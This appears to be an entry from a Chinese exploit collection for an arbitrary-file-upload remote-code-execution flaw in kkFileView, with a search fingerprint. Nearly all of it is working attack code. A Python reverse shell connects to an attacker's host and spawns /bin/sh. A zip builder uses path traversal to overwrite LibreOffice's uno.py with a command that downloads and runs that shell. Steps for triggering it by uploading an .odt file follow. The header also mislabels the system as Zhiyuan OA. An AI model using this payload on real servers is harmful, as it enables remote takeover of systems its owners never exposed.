# kkFileView存在任意文件上传致远程代码执行漏洞

- **系统**：致远OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="kkFileView"`

**请求体 / payload**
```
保存ft.py,vpn起web服务
import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ip",port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
制作ft.zip,上传并预览
import zipfile
if __name__ == "__main__":
try:
binary1 = b'test123'
binary2 = b'import os\r\nos.system(\'wget http://vps:30285/ft.py && python3 ft.py\')'
zipFile = zipfile.ZipFile("ft.zip", "a", zipfile.ZIP_DEFLATED)
info = zipfile.ZipInfo("ft.zip")
zipFile.writestr("test", binary1)
zipFile.writestr("../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py", binary2)
zipFile.close()
except IOError as e:
raise e
然后随便创一个.odt文件，上传并浏览。
```